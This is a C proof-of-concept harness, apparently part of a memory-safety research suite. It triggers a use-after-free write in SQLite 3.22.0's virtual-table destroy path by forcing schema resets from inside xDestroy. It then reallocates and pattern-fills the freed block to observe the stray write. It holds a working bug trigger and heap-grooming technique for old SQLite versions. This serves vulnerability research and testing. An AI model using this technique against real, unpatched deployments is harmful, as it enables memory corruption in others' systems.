/* row2 / sqlite-c589acbc50 -- sqlite3VtabCallDestroy() invokes the module xDestroy()
 * without holding a reference on the Table, then touches the Table afterwards:
 *
 *     p = vtabDisconnectAll(db, pTab);
 *     xDestroy = p->pMod->pModule->xDestroy;
 *     rc = xDestroy(p->pVtab);            <-- user callback; may reset the schema
 *     if( rc==SQLITE_OK ){
 *       assert( pTab->pVTable==p && p->pNext==0 );
 *       p->pVtab = 0;
 *       pTab->pVTable = 0;                <-- WRITE to pTab, possibly freed by now
 *       sqlite3VtabUnlock(p);
 *     }
 *
 * If xDestroy causes a schema reset, the Table (nTabRef==1) is freed and
 * "pTab->pVTable = 0" is a use-after-free WRITE. Fixed 3.29.0. Core, any vtab module.
 *
 * TWO problems this domain has to solve.
 *
 * 1. Forcing the reset. The reliable lever in 3.22.0 is sqlite3LockAndPrepare's retry
 *    loop, which on SQLITE_SCHEMA runs sqlite3ResetOneSchema(db,-1) -- a reset of ALL
 *    schemas. Since it is not obvious which statement run from inside xDestroy trips
 *    that, the domain SWEEPS several candidate strategies, one per DROP TABLE.
 *
 * 2. Proving the UAF happened. The write stores 0 into a pointer field, and memsys5s
 *    whole arena is ONE allocation, so a dangling pointer into it stays in bounds and
 *    tagged: base Capstone CANNOT fault on this, and a silent PASS would be
 *    indistinguishable from "the strategy did nothing". So after running its strategy,
 *    xDestroy immediately sqlite3_malloc()s a block of the same size class and fills it
 *    with a known pattern, aiming to receive the just-freed Table block back (memsys5
 *    hands back the most recently freed block of a size class). Once DROP TABLE returns
 *    the domain rescans that buffer: any 16-byte granule that is no longer the pattern
 *    is the "pTab->pVTable = 0" store landing in freed-and-reused memory -- direct
 *    evidence, not inference.
 * NOTE -DSQLITE_DQS=0 -> SQL string literals must be single-quoted. */
#include "repro322_common.h"

typedef struct MyTab { sqlite3_vtab base; sqlite3 *db; } MyTab;
typedef struct MyCur { sqlite3_vtab_cursor base; int i; } MyCur;

static sqlite3_module g_mod;          /* filled in at run time, field by field */
static int   g_strategy = 0;
static char *g_probe    = 0;          /* block we try to place over the freed Table */
static int   g_probe_n  = 0;
#define PROBE_BYTE 0x5A
#define PROBE_SZ   512                /* covers Table's size class comfortably */

static int myConnect(sqlite3 *db, void *pAux, int argc, const char *const*argv,
                     sqlite3_vtab **ppVtab, char **pzErr){
  MyTab *p; int rc;
  (void)pAux; (void)argc; (void)argv; (void)pzErr;
  rc = sqlite3_declare_vtab(db, "CREATE TABLE x(a)");
  if (rc != SQLITE_OK) return rc;
  p = (MyTab*)sqlite3_malloc((int)sizeof(*p));
  if (!p) return SQLITE_NOMEM;
  memset(p, 0, sizeof(*p));
  p->db = db;
  *ppVtab = &p->base;
  return SQLITE_OK;
}
static int myBestIndex(sqlite3_vtab *tab, sqlite3_index_info *pIdx){
  (void)tab; pIdx->estimatedCost = 1.0; return SQLITE_OK;
}
static int myDisconnect(sqlite3_vtab *pVtab){ sqlite3_free(pVtab); return SQLITE_OK; }

static int myDestroy(sqlite3_vtab *pVtab){
  sqlite3 *db = ((MyTab*)pVtab)->db;
  sqlite3_stmt *st = 0;
  switch (g_strategy){
    case 1: sqlite3_prepare_v2(db, "SELECT * FROM sqlite_master", -1, &st, 0);
            sqlite3_finalize(st); break;
    case 2: sqlite3_exec(db, "SELECT 1 FROM nosuchtable;", 0, 0, 0); break;
    case 3: sqlite3_exec(db, "PRAGMA writable_schema=1;"
                             "UPDATE sqlite_master SET rootpage=rootpage;", 0, 0, 0); break;
    case 4: sqlite3_exec(db, "CREATE TABLE zzmark2(x);", 0, 0, 0); break;
    case 5: sqlite3_exec(db, "PRAGMA schema_version=99;", 0, 0, 0); break;
    case 6: sqlite3_exec(db, "ATTACH ':memory:' AS zzaux; DETACH zzaux;", 0, 0, 0); break;
    /* 7-9: bump the schema cookie and THEN prepare, so the prepare sees a cookie
     * mismatch, returns SQLITE_SCHEMA, and sqlite3LockAndPrepare's retry loop runs
     * sqlite3ResetOneSchema(db,-1) -- a reset of all schemas, freeing the Table.
     * Strategy 5 set the cookie but never prepared, which is why it did nothing. */
    case 7: sqlite3_exec(db, "PRAGMA writable_schema=1;", 0, 0, 0);
            sqlite3_exec(db, "PRAGMA schema_version=12345;", 0, 0, 0);
            sqlite3_prepare_v2(db, "SELECT * FROM sqlite_master", -1, &st, 0);
            sqlite3_finalize(st); break;
    case 8: sqlite3_exec(db, "PRAGMA schema_version=54321;", 0, 0, 0);
            sqlite3_prepare_v2(db, "SELECT count(*) FROM zzmark", -1, &st, 0);
            sqlite3_finalize(st); break;
    case 9: sqlite3_exec(db, "PRAGMA schema_version=999; SELECT * FROM sqlite_master;", 0, 0, 0);
            break;
    default: break;
  }
  sqlite3_free(pVtab);
  /* try to land on the just-freed Table block and mark it */
  g_probe = (char*)sqlite3_malloc(PROBE_SZ);
  g_probe_n = g_probe ? PROBE_SZ : 0;
  if (g_probe) memset(g_probe, PROBE_BYTE, PROBE_SZ);
  return SQLITE_OK;
}
static int myOpen(sqlite3_vtab *p, sqlite3_vtab_cursor **ppCur){
  MyCur *c = (MyCur*)sqlite3_malloc((int)sizeof(*c));
  (void)p; if (!c) return SQLITE_NOMEM;
  memset(c, 0, sizeof(*c)); *ppCur = &c->base; return SQLITE_OK;
}
static int myClose(sqlite3_vtab_cursor *cur){ sqlite3_free(cur); return SQLITE_OK; }
static int myFilter(sqlite3_vtab_cursor *cur, int idxNum, const char *idxStr,
                    int argc, sqlite3_value **argv){
  (void)idxNum; (void)idxStr; (void)argc; (void)argv;
  ((MyCur*)cur)->i = 0; return SQLITE_OK;
}
static int myNext(sqlite3_vtab_cursor *cur){ ((MyCur*)cur)->i++; return SQLITE_OK; }
static int myEof(sqlite3_vtab_cursor *cur){ return ((MyCur*)cur)->i >= 1; }
static int myColumn(sqlite3_vtab_cursor *cur, sqlite3_context *ctx, int i){
  (void)cur; (void)i; sqlite3_result_int(ctx, 42); return SQLITE_OK;
}
static int myRowid(sqlite3_vtab_cursor *cur, sqlite3_int64 *pRowid){
  (void)cur; *pRowid = 1; return SQLITE_OK;
}

static int run_case(void){
  if (repro_init()) return 1;
  sqlite3 *db = 0; int rc = sqlite3_open(":memory:", &db);
  if (rc != SQLITE_OK) return FAILRC("open", rc);

  memset(&g_mod, 0, sizeof(g_mod));
  g_mod.iVersion   = 1;
  g_mod.xCreate    = myConnect;      /* regular vtab: xCreate must be non-NULL */
  g_mod.xConnect   = myConnect;
  g_mod.xBestIndex = myBestIndex;
  g_mod.xDisconnect= myDisconnect;
  g_mod.xDestroy   = myDestroy;
  g_mod.xOpen      = myOpen;
  g_mod.xClose     = myClose;
  g_mod.xFilter    = myFilter;
  g_mod.xNext      = myNext;
  g_mod.xEof       = myEof;
  g_mod.xColumn    = myColumn;
  g_mod.xRowid     = myRowid;
  rc = sqlite3_create_module(db, "mymod", &g_mod, 0);
  out_text("vtabdestroy create_module rc="); out_uint((unsigned)(rc<0?-rc:rc)); out_text("\n");
  sqlite3_exec(db, "CREATE TABLE zzmark(x);", 0, 0, 0);

  int s;
  for (s = 1; s <= 9; s++){
    char *e = 0;
    g_strategy = s; g_probe = 0; g_probe_n = 0;
    out_text("-- strategy "); out_uint((unsigned)s); out_text("\n");

    rc = sqlite3_exec(db, "CREATE VIRTUAL TABLE vt USING mymod;", 0, 0, &e);
    out_text("   create rc="); out_uint((unsigned)(rc<0?-rc:rc));
    if (e){ out_text(" ("); out_text(e); out_text(")"); sqlite3_free(e); e = 0; }
    out_text("\n");
    if (rc != SQLITE_OK) continue;

    rc = sqlite3_exec(db, "DROP TABLE vt;", 0, 0, &e);
    out_text("   drop rc="); out_uint((unsigned)(rc<0?-rc:rc));
    if (e){ out_text(" ("); out_text(e); out_text(")"); sqlite3_free(e); e = 0; }
    out_text("\n");

    /* did the post-xDestroy write land in our probe block? */
    if (g_probe_n){
      int i, dirty = 0, first = -1;
      for (i = 0; i < g_probe_n; i++){
        if ((unsigned char)g_probe[i] != PROBE_BYTE){ dirty++; if (first < 0) first = i; }
      }
      out_text("   probe dirty_bytes="); out_uint((unsigned)dirty);
      if (dirty){ out_text(" first_off="); out_uint((unsigned)first);
                  out_text("  <== UAF WRITE observed in freed+reused block"); }
      out_text("\n");
      sqlite3_free(g_probe); g_probe = 0; g_probe_n = 0;
    } else {
      out_text("   probe alloc failed\n");
    }
  }

  sqlite3_close(db);
  out_text("vtabdestroy NOTRAP done\n");
  return 0;
}
REPRO322_MAIN("vtabdestroy")
